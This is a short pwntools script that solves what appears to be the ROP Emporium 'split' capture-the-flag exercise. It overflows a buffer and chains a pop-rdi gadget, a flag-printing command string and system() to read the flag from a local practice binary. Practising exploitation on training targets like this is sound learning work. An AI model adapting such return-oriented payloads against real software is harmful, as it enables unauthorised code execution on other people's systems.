#/usr/bin/python3
from pwn import process, p64, log

shell = process("./split")

offset = 40
junk = b"A" * offset

system = p64(0x400560)
cat_flag = p64(0x601060)
pop_rdi = p64(0x4007c3)
ret = p64(0x40053e)

payload  = b""
payload += junk
payload += pop_rdi + cat_flag
payload += ret
payload += system

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
